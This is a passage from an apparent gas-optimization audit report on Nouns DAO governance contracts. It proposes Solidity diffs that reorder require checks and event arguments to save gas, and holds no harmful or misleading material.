https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L904-L909

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
904:    function _burnVetoPower() public {
905:        // Check caller is vetoer
906:        require(msg.sender == vetoer, 'NounsDAO::_burnVetoPower: vetoer only');

908:        // Update vetoer to 0x0
909:        emit NewVetoer(vetoer, address(0));
```

```diff
--- a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
+++ b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
@@ -906,7 +906,7 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {
         require(msg.sender == vetoer, 'NounsDAO::_burnVetoPower: vetoer only');

         // Update vetoer to 0x0
-        emit NewVetoer(vetoer, address(0));
+        emit NewVetoer(msg.sender, address(0));
         vetoer = address(0);
```

### NounsDAOProxy.sol.\_setImplementation(): Emit `implementation_` instead of `implementation` (Save 1 SLOAD: 100 gas)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOProxy.sol#L83-L85

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOProxy.sol
83:        implementation = implementation_;

85:        emit NewImplementation(oldImplementation, implementation);
```

```diff
diff --git a/packages/nouns-contracts/contracts/governance/NounsDAOProxy.sol b/packages/nouns-contracts/contracts/governance/NounsDAOProxy.sol
index f42e3bf6..e95391cf 100644
--- a/packages/nouns-contracts/contracts/governance/NounsDAOProxy.sol
+++ b/packages/nouns-contracts/contracts/governance/NounsDAOProxy.sol
@@ -82,7 +82,7 @@ contract NounsDAOProxy is NounsDAOProxyStorage, NounsDAOEvents {
         address oldImplementation = implementation;
         implementation = implementation_;

-        emit NewImplementation(oldImplementation, implementation);
+        emit NewImplementation(oldImplementation, implementation_);
     }
```

### NounsDAOExecutor.sol.setDelay(): Emit `delay_` instead of `delay` (Save 1 SLOAD: 100 gas)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol#L80-L87

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol
80:    function setDelay(uint256 delay_) public {

84:        delay = delay_;
        
86:        emit NewDelay(delay);
87:    }
```

```diff
         require(delay_ <= MAXIMUM_DELAY, 'NounsDAOExecutor::setDelay: Delay must not exceed maximum delay.');
         delay = delay_;

-        emit NewDelay(delay);
+        emit NewDelay(delay_);
     }
```

### NounsDAOExecutor.sol.acceptAdmin(): Emit `msg.sender` instead of `admin` (Save 1 SLOAD: 100 gas)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol#L89-L95

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol
89:    function acceptAdmin() public {

91:        admin = msg.sender;
     
94:        emit NewAdmin(admin);
```

```diff
--- a/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol
+++ b/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol
@@ -91,7 +91,7 @@ contract NounsDAOExecutor {
         admin = msg.sender;
         pendingAdmin = address(0);

-        emit NewAdmin(admin);
+        emit NewAdmin(msg.sender);

```

### NounsDAOExecutor.sol.setPendingAdmin(): Emit `pendingAdmin_` instead of `pendingAdmin` (Save 1 SLOAD: 100 gas)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol#L97-L105

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol
97:    function setPendingAdmin(address pendingAdmin_) public {

102:        pendingAdmin = pendingAdmin_;

104:        emit NewPendingAdmin(pendingAdmin);
105:    }
```

```diff
diff --git a/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol b/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol
index 2f87cd01..1f23d7c4 100644
--- a/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol
+++ b/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol
@@ -101,7 +101,7 @@ contract NounsDAOExecutor {
         );
         pendingAdmin = pendingAdmin_;

-        emit NewPendingAdmin(pendingAdmin);
+        emit NewPendingAdmin(pendingAdmin_);
```

</details>

## [G-08] Optimizing check order for cost efficient function execution

Checks that involve constants should come before checks that involve state variables, function calls, and calculations. By doing these checks first, the function is able to revert before wasting a Gcoldsload (2100 gas) in a function that may ultimately revert in the unhappy case.

<details>

### Cheaper require statements should be performed first
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L143-L161

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
143:    ) public virtual {
144:        require(address(timelock) == address(0), 'NounsDAO::initialize: can only initialize once');
145:        if (msg.sender != admin) {
146:            revert AdminOnly();
147:        }
148:        require(timelock_ != address(0), 'NounsDAO::initialize: invalid timelock address');
149:        require(nouns_ != address(0), 'NounsDAO::initialize: invalid nouns address');
150:        require(
151:            votingPeriod_ >= MIN_VOTING_PERIOD && votingPeriod_ <= MAX_VOTING_PERIOD,
152:            'NounsDAO::initialize: invalid voting period'
153:        );
154:        require(
155:            votingDelay_ >= MIN_VOTING_DELAY && votingDelay_ <= MAX_VOTING_DELAY,
156:            'NounsDAO::initialize: invalid voting delay'
157:        );
158:        require(
159:            proposalThresholdBPS_ >= MIN_PROPOSAL_THRESHOLD_BPS && proposalThresholdBPS_ <= MAX_PROPOSAL_THRESHOLD_BPS,
160:            'NounsDAO::initialize: invalid proposal threshold bps'
161:        );
```
In the above function, the first sanity checks(require statements) validates some state variables ie Involves reading from state which is quite expensive(2100 Cold ,100 warm). In this case we read `timelock` and `admin` . In case of a revert on other cheaper checks eg function parameter checks, we would end up wasting the gas spent validating the state variables ~4000 gas. To minimize this cost, we can first validate the variables that are cheaper to check. Reorder the checks as follows.

```diff
diff --git a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
index ff426a81..1f02f8dd 100644
--- a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
+++ b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
@@ -141,10 +141,6 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {
         uint256 proposalThresholdBPS_,
         DynamicQuorumParams calldata dynamicQuorumParams_
     ) public virtual {
-        require(address(timelock) == address(0), 'NounsDAO::initialize: can only initialize once');
-        if (msg.sender != admin) {
-            revert AdminOnly();
-        }
         require(timelock_ != address(0), 'NounsDAO::initialize: invalid timelock address');
         require(nouns_ != address(0), 'NounsDAO::initialize: invalid nouns address');
         require(
@@ -159,6 +155,10 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {
             proposalThresholdBPS_ >= MIN_PROPOSAL_THRESHOLD_BPS && proposalThresholdBPS_ <= MAX_PROPOSAL_THRESHOLD_BPS,
             'NounsDAO::initialize: invalid proposal threshold bps'
         );
+        require(address(timelock) == address(0), 'NounsDAO::initialize: can only initialize once');
+        if (msg.sender != admin) {
+            revert AdminOnly();
+        }

```

### External calls + state reads are very expensive. Validate local/functional parameters first
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L204-L221

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
204:        ProposalTemp memory temp;

206:        temp.totalSupply = nouns.totalSupply();

208:        temp.proposalThreshold = bps2Uint(proposalThresholdBPS, temp.totalSupply);

210:        require(
211:            nouns.getPriorVotes(msg.sender, block.number - 1) > temp.proposalThreshold,
212:            'NounsDAO::propose: proposer votes below proposal threshold'
213:        );
214:        require(
215:            targets.length == values.length &&
216:                targets.length == signatures.length &&
217:                targets.length == calldatas.length,
218:            'NounsDAO::propose: proposal function information arity mismatch'
219:        );
220:        require(targets.length != 0, 'NounsDAO::propose: must provide actions');
221:        require(targets.length <= proposalMaxOperations, 'NounsDAO::propose: too many actions');
```

In our function above, we start by making some external function calls `nouns.totalSupply()` and reading from state `proposalThresholdBPS`. We then do some validation for some function parameters. As reading function parameters is cheaper, we should validate them first , so that if they don't pass our check, we can revert early and without too much gas.

```diff
diff --git a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
index ff426a81..15ecc0c6 100644
--- a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
+++ b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
@@ -201,6 +201,15 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {
         bytes[] memory calldatas,
         string memory description
     ) public returns (uint256) {
+        require(
+            targets.length == values.length &&
+                targets.length == signatures.length &&
+                targets.length == calldatas.length,
+            'NounsDAO::propose: proposal function information arity mismatch'
+        );
+        require(targets.length != 0, 'NounsDAO::propose: must provide actions');
+        require(targets.length <= proposalMaxOperations, 'NounsDAO::propose: too many actions');
+
         ProposalTemp memory temp;

         temp.totalSupply = nouns.totalSupply();
@@ -211,14 +220,6 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {
             nouns.getPriorVotes(msg.sender, block.number - 1) > temp.proposalThreshold,
             'NounsDAO::propose: proposer votes below proposal threshold'
         );
-        require(
-            targets.length == values.length &&
-                targets.length == signatures.length &&
-                targets.length == calldatas.length,
-            'NounsDAO::propose: proposal function information arity mismatch'
-        );
-        require(targets.length != 0, 'NounsDAO::propose: must provide actions');
-        require(targets.length <= proposalMaxOperations, 'NounsDAO::propose: too many actions');
```

### Validate function parameter first before reading from state
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L615-L617

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
615:    ) internal returns (uint96) {
616:        require(state(proposalId) == ProposalState.Active, 'NounsDAO::castVoteInternal: voting is closed');
617:        require(support <= 2, 'NounsDAO::castVoteInternal: invalid vote type');
```
As `support` is a function parameter, it would be cheaper to validate it first before reading the state variable `ProposalState`.

In case of a revert on the check `support <= 2` we would not end up wasting too much gas validating the state variable.

```diff
diff --git a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
index ff426a81..2c5034df 100644
--- a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
+++ b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
@@ -613,8 +613,8 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {
         uint256 proposalId,
         uint8 support
     ) internal returns (uint96) {
-        require(state(proposalId) == ProposalState.Active, 'NounsDAO::castVoteInternal: voting is closed');
         require(support <= 2, 'NounsDAO::castVoteInternal: invalid vote type');
+        require(state(proposalId) == ProposalState.Active, 'NounsDAO::castVoteInternal: voting is closed');
```

### Avoid validating state variables before validating function parameters
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L644-L651

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
644:    function _setVotingDelay(uint256 newVotingDelay) external {
645:        if (msg.sender != admin) {
646:            revert AdminOnly();
647:        }
648:        require(
649:            newVotingDelay >= MIN_VOTING_DELAY && newVotingDelay <= MAX_VOTING_DELAY,
650:            'NounsDAO::_setVotingDelay: invalid voting delay'
651:        );
```
In the above, the second check reads function parameters and constants. The first check reads from state. As it it more gas efficient to read function parameters and constants, we should validate it first.

```diff
diff --git a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
index ff426a81..52a3bb63 100644
--- a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
+++ b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
@@ -642,13 +642,13 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {
      * @param newVotingDelay new voting delay, in blocks
      */
     function _setVotingDelay(uint256 newVotingDelay) external {
-        if (msg.sender != admin) {
-            revert AdminOnly();
-        }
         require(
             newVotingDelay >= MIN_VOTING_DELAY && newVotingDelay <= MAX_VOTING_DELAY,
             'NounsDAO::_setVotingDelay: invalid voting delay'
         );
+        if (msg.sender != admin) {
+            revert AdminOnly();
+        }
```

### Validate function parameters first before reading any state variables
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L663-L669

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
663:        if (msg.sender != admin) {
664:            revert AdminOnly();
665:        }
666:        require(
667:            newVotingPeriod >= MIN_VOTING_PERIOD && newVotingPeriod <= MAX_VOTING_PERIOD,
668:            'NounsDAO::_setVotingPeriod: invalid voting period'
669:        );
```
Reorder the checks to validate function parameters first as they are cheaper to read compared to state variables.

```diff
     function _setVotingPeriod(uint256 newVotingPeriod) external {
-        if (msg.sender != admin) {
-            revert AdminOnly();
-        }
         require(
             newVotingPeriod >= MIN_VOTING_PERIOD && newVotingPeriod <= MAX_VOTING_PERIOD,
             'NounsDAO::_setVotingPeriod: invalid voting period'
         );
+        if (msg.sender != admin) {
+            revert AdminOnly();
+        }
```

### Validate Function parameter  before validating state variables
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L681-L689

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
681:    function _setProposalThresholdBPS(uint256 newProposalThresholdBPS) external {
682:        if (msg.sender != admin) {
683:            revert AdminOnly();
684:        }
685:        require(
686:            newProposalThresholdBPS >= MIN_PROPOSAL_THRESHOLD_BPS &&
687:                newProposalThresholdBPS <= MAX_PROPOSAL_THRESHOLD_BPS,
688:            'NounsDAO::_setProposalThreshold: invalid proposal threshold bps'
689:        );
```
In case of a revert on the function parameter validation, we might save some good amount of gas (SLOAD) that would have been used in reading `admin` which is a state variable.

```diff
diff --git a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
index ff426a81..2a9aca20 100644
--- a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
+++ b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
@@ -679,14 +679,14 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {
      * @param newProposalThresholdBPS new proposal threshold
      */
     function _setProposalThresholdBPS(uint256 newProposalThresholdBPS) external {
-        if (msg.sender != admin) {
-            revert AdminOnly();
-        }
         require(
             newProposalThresholdBPS >= MIN_PROPOSAL_THRESHOLD_BPS &&
                 newProposalThresholdBPS <= MAX_PROPOSAL_THRESHOLD_BPS,
             'NounsDAO::_setProposalThreshold: invalid proposal threshold bps'
         );
+        if (msg.sender != admin) {
+            revert AdminOnly();
+        }
```

### Reorder the checks here to have cheaper checks first
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L702-L711

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
702:    function _setMinQuorumVotesBPS(uint16 newMinQuorumVotesBPS) external {
703:        if (msg.sender != admin) {
704:            revert AdminOnly();
705:        }
706:        DynamicQuorumParams memory params = getDynamicQuorumParamsAt(block.number);

708:        require(
709:            newMinQuorumVotesBPS >= MIN_QUORUM_VOTES_BPS_LOWER_BOUND &&
710:                newMinQuorumVotesBPS <= MIN_QUORUM_VOTES_BPS_UPPER_BOUND,
711:            'NounsDAO::_setMinQuorumVotesBPS: invalid min quorum votes bps'
```
We have a check for function parameters against some constants variables. As this is a cheaper check, it should be done before any other check or any other operations.<br>
Move the check to the beginning.

```diff
     function _setMinQuorumVotesBPS(uint16 newMinQuorumVotesBPS) external {
-        if (msg.sender != admin) {
-            revert AdminOnly();
-        }
-        DynamicQuorumParams memory params = getDynamicQuorumParamsAt(block.number);
-
         require(
             newMinQuorumVotesBPS >= MIN_QUORUM_VOTES_BPS_LOWER_BOUND &&
                 newMinQuorumVotesBPS <= MIN_QUORUM_VOTES_BPS_UPPER_BOUND,
             'NounsDAO::_setMinQuorumVotesBPS: invalid min quorum votes bps'
         );
+        if (msg.sender != admin) {
+            revert AdminOnly();
+        }
+        DynamicQuorumParams memory params = getDynamicQuorumParamsAt(block.number);
+
         require(
             newMinQuorumVotesBPS <= params.maxQuorumVotesBPS,
             'NounsDAO::_setMinQuorumVotesBPS: min quorum votes bps greater than max'
```

### Function parameters should be validated first
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L732-L741

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
732:    function _setMaxQuorumVotesBPS(uint16 newMaxQuorumVotesBPS) external {
733:        if (msg.sender != admin) {
734:            revert AdminOnly();
735:        }
736:        DynamicQuorumParams memory params = getDynamicQuorumParamsAt(block.number);

738:        require(
739:            newMaxQuorumVotesBPS <= MAX_QUORUM_VOTES_BPS_UPPER_BOUND,
740:            'NounsDAO::_setMaxQuorumVotesBPS: invalid max quorum votes bps'
741:        );
```
Consider validating the function parameter `newMaxQuorumVotesBPS` before reading from state . The first check `msg.sender != admin` involves reading a state variable `admin`. Reading from state is expensive. As it is, in case of a revert on the require statement on line 738, the gas consumed reading from state would be wasted.

```diff
     function _setMaxQuorumVotesBPS(uint16 newMaxQuorumVotesBPS) external {
+        require(
+            newMaxQuorumVotesBPS <= MAX_QUORUM_VOTES_BPS_UPPER_BOUND,
+            'NounsDAO::_setMaxQuorumVotesBPS: invalid max quorum votes bps'
+        );
         if (msg.sender != admin) {
             revert AdminOnly();
         }
         DynamicQuorumParams memory params = getDynamicQuorumParamsAt(block.number);

-        require(
-            newMaxQuorumVotesBPS <= MAX_QUORUM_VOTES_BPS_UPPER_BOUND,
-            'NounsDAO::_setMaxQuorumVotesBPS: invalid max quorum votes bps'
-        );
```

### Validate all function parameters first before reading any state variables
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L783-L802

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
783:    function _setDynamicQuorumParams(
784:        uint16 newMinQuorumVotesBPS,
785:        uint16 newMaxQuorumVotesBPS,
786:        uint32 newQuorumCoefficient
787:    ) public {
788:        if (msg.sender != admin) {
789:            revert AdminOnly();
790:        }
791:        if (
792:            newMinQuorumVotesBPS < MIN_QUORUM_VOTES_BPS_LOWER_BOUND ||
793:            newMinQuorumVotesBPS > MIN_QUORUM_VOTES_BPS_UPPER_BOUND
794:        ) {
795:            revert InvalidMinQuorumVotesBPS();
796:        }
797:        if (newMaxQuorumVotesBPS > MAX_QUORUM_VOTES_BPS_UPPER_BOUND) {
798:            revert InvalidMaxQuorumVotesBPS();
799:        }
800:        if (newMinQuorumVotesBPS > newMaxQuorumVotesBPS) {
801:            revert MinQuorumBPSGreaterThanMaxQuorumBPS();
802:        }
```

```diff
@@ -785,9 +785,6 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {
         uint16 newMaxQuorumVotesBPS,
         uint32 newQuorumCoefficient
     ) public {
-        if (msg.sender != admin) {
-            revert AdminOnly();
-        }
         if (
             newMinQuorumVotesBPS < MIN_QUORUM_VOTES_BPS_LOWER_BOUND ||
             newMinQuorumVotesBPS > MIN_QUORUM_VOTES_BPS_UPPER_BOUND
@@ -800,7 +797,10 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {
         if (newMinQuorumVotesBPS > newMaxQuorumVotesBPS) {
             revert MinQuorumBPSGreaterThanMaxQuorumBPS();
         }
-
+        if (msg.sender != admin) {
+            revert AdminOnly();
+        }
+
```

### Validate function parameters before validating state variables
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOProxy.sol#L78-L80

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOProxy.sol
78:    function _setImplementation(address implementation_) public {
79:        require(msg.sender == admin, 'NounsDAOProxy::_setImplementation: admin only');
80:        require(implementation_ != address(0), 'NounsDAOProxy::_setImplementation: invalid implementation address');
```

The first check, `msg.sender == admin` involves reading from state `admin` which is a bit expensive. The second check, however validates that a function parameter `implementation_` != `address(0)`. As the second check is cheaper , it should be done first so that in case it reverts , no gas would be wasted reading from state.

```diff
     function _setImplementation(address implementation_) public {
-        require(msg.sender == admin, 'NounsDAOProxy::_setImplementation: admin only');
         require(implementation_ != address(0), 'NounsDAOProxy::_setImplementation: invalid implementation address');
-
+        require(msg.sender == admin, 'NounsDAOProxy::_setImplementation: admin only');
+
```

### Function parameters should be checked first before reading any state variables
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol#L150-L153

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol
150:        if (address(ds.timelock) != address(0)) revert CanOnlyInitializeOnce();
151:        if (msg.sender != ds.admin) revert AdminOnly();
152:        if (timelock_ == address(0)) revert InvalidTimelockAddress();
153:        if (nouns_ == address(0)) revert InvalidNounsAddress();
```
The first two checks involves reading some state variables ie `ds.timelock` and `ds.admin`. The next two simply checks some local variables(function parameters). Reading function parameters is cheaper than state variables and in case of a revert on the function parameter check, we would end up wasting too much gas on reading state. We should reorder the checks to have cheaper checks first.

```diff
diff --git a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol
index 00c5ccdc..fee29faa 100644
--- a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol
+++ b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol
@@ -147,10 +147,10 @@ contract NounsDAOLogicV3 is NounsDAOStorageV3, NounsDAOEventsV3 {
         NounsDAOParams calldata daoParams_,
         DynamicQuorumParams calldata dynamicQuorumParams_
     ) public virtual {
-        if (address(ds.timelock) != address(0)) revert CanOnlyInitializeOnce();
-        if (msg.sender != ds.admin) revert AdminOnly();
         if (timelock_ == address(0)) revert InvalidTimelockAddress();
         if (nouns_ == address(0)) revert InvalidNounsAddress();
+        if (address(ds.timelock) != address(0)) revert CanOnlyInitializeOnce();
+        if (msg.sender != ds.admin) revert AdminOnly();

```

### Validate parameters before making external function calls
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol#L351-L365

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol
351:    function _setMinQuorumVotesBPS(NounsDAOStorageV3.StorageV3 storage ds, uint16 newMinQuorumVotesBPS)
352:        external
353:        onlyAdmin(ds)
354:    {
355:        NounsDAOStorageV3.DynamicQuorumParams memory params = ds.getDynamicQuorumParamsAt(block.number);

357:        require(
358:            newMinQuorumVotesBPS >= MIN_QUORUM_VOTES_BPS_LOWER_BOUND &&
359:                newMinQuorumVotesBPS <= MIN_QUORUM_VOTES_BPS_UPPER_BOUND,
360:            'NounsDAO::_setMinQuorumVotesBPS: invalid min quorum votes bps'
361:        );
362:        require(
363:            newMinQuorumVotesBPS <= params.maxQuorumVotesBPS,
364:            'NounsDAO::_setMinQuorumVotesBPS: min quorum votes bps greater than max'
365:        );
```
We make an external call `getDynamicQuorumParamsAt(block.number)` then we make some checks  for the function parameters. If the parameters don't meet our requirements, we would end up reverting. In case of a revert, it would mean that the gas spent making the external function call was wasted. We should reorder this checks to validate the parameters first before doing the external calls. This way, a revert on the parameter check would not waste gas doing the external call.

```diff
diff --git a/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol b/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol
index 4dcacae8..c2218691 100644
--- a/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol
+++ b/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol
@@ -352,13 +352,13 @@ library NounsDAOV3Admin {
         external
         onlyAdmin(ds)
     {
-        NounsDAOStorageV3.DynamicQuorumParams memory params = ds.getDynamicQuorumParamsAt(block.number);
-
         require(
             newMinQuorumVotesBPS >= MIN_QUORUM_VOTES_BPS_LOWER_BOUND &&
                 newMinQuorumVotesBPS <= MIN_QUORUM_VOTES_BPS_UPPER_BOUND,
             'NounsDAO::_setMinQuorumVotesBPS: invalid min quorum votes bps'
         );
+        NounsDAOStorageV3.DynamicQuorumParams memory params = ds.getDynamicQuorumParamsAt(block.number);
+
         require(
             newMinQuorumVotesBPS <= params.maxQuorumVotesBPS,
             'NounsDAO::_setMinQuorumVotesBPS: min quorum votes bps greater than max'
```

### Avoid making external calls before validating function parameters
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol#L381-L390

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol
381:    function _setMaxQuorumVotesBPS(NounsDAOStorageV3.StorageV3 storage ds, uint16 newMaxQuorumVotesBPS)
382:        external
383:        onlyAdmin(ds)
384:    {
385:        NounsDAOStorageV3.DynamicQuorumParams memory params = ds.getDynamicQuorumParamsAt(block.number);

387:        require(
388:            newMaxQuorumVotesBPS <= MAX_QUORUM_VOTES_BPS_UPPER_BOUND,
389:            'NounsDAO::_setMaxQuorumVotesBPS: invalid max quorum votes bps'
390:        );
```
In the above function, we are making an external `getDynamicQuorumParamsAt(block.number)` then we do some validity checks. In case of a revert when validating the function parameter `newMaxQuorumVotesBPS` the gas used making the external call would be wasted. Perform all validations first before making any external calls.

```diff
-        NounsDAOStorageV3.DynamicQuorumParams memory params = ds.getDynamicQuorumParamsAt(block.number);
-
         require(
             newMaxQuorumVotesBPS <= MAX_QUORUM_VOTES_BPS_UPPER_BOUND,
             'NounsDAO::_setMaxQuorumVotesBPS: invalid max quorum votes bps'
         );
+        NounsDAOStorageV3.DynamicQuorumParams memory params = ds.getDynamicQuorumParamsAt(block.number);
+
```

### Validate function parameters before validating state variables
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L176-L178

```solidity
File: /packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol
176:        require(address(timelock) == address(0), 'NounsDAO::initialize: can only initialize once');
177:        require(timelock_ != address(0), 'NounsDAO::initialize: invalid timelock address');
178:        require(nouns_ != address(0), 'NounsDAO::initialize: invalid nouns address');
```

If we end up reverting on the checks for function parameters(`timelock_` and `nouns_`) the gas spent reading the state variable `timelock` would be wasted. As SLOAD are quite expensive, it would be wise to first validate the cheaper variables.

```diff
         __ReentrancyGuard_init_unchained();
-        require(address(timelock) == address(0), 'NounsDAO::initialize: can only initialize once');
         require(timelock_ != address(0), 'NounsDAO::initialize: invalid timelock address');
         require(nouns_ != address(0), 'NounsDAO::initialize: invalid nouns address');
+        require(address(timelock) == address(0), 'NounsDAO::initialize: can only initialize once');
```

### Validate all function parameters first before doing other operations 
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L279-L298

```solidity
File: /packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol
279:        checkGovernanceActive();

281:        ProposalTemp memory temp;

283:        temp.totalSupply = adjustedTotalSupply();

285:        temp.proposalThreshold = bps2Uint(proposalThresholdBPS, temp.totalSupply);

287:        require(
288:            nouns.getPriorVotes(msg.sender, block.number - 1) > temp.proposalThreshold,
289:            'NounsDAO::propose: proposer votes below proposal threshold'
290:        );
291:        require(
292:            targets.length == values.length &&
293:                targets.length == signatures.length &&
294:                targets.length == calldatas.length,
295:            'NounsDAO::propose: proposal function information arity mismatch'
296:        );
297:        require(targets.length != 0, 'NounsDAO::propose: must provide actions');
298:        require(targets.length <= proposalMaxOperations, 'NounsDAO::propose: too many actions');
```

```diff
+        require(
+            targets.length == values.length &&
+                targets.length == signatures.length &&
+                targets.length == calldatas.length,
+            'NounsDAO::propose: proposal function information arity mismatch'
+        );
+        require(targets.length != 0, 'NounsDAO::propose: must provide actions');
+        require(targets.length <= proposalMaxOperations, 'NounsDAO::propose: too many actions');
+
         checkGovernanceActive();

         ProposalTemp memory temp;
@@ -288,14 +297,6 @@ contract NounsDAOLogicV1Fork is UUPSUpgradeable, ReentrancyGuardUpgradeable, Nou
